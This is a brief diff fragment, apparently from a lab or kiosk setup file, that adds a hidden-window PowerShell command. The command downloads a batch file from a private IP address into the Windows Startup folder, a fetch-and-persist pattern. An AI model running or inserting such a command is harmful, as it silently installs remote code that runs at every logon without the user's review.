@@ -183,4 +183,9 @@ netsh wlan add profile filename="C:\WiFi\lab.exe_WiFi7.xml" user=all
 
 
 
+```
+powershell -WindowStyle Hidden -Command "curl.exe -s -o \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sms-kiosk.bat\" http://10.10.10.6:4010/windows-client-kiosk.bat"
+```
+
+
 
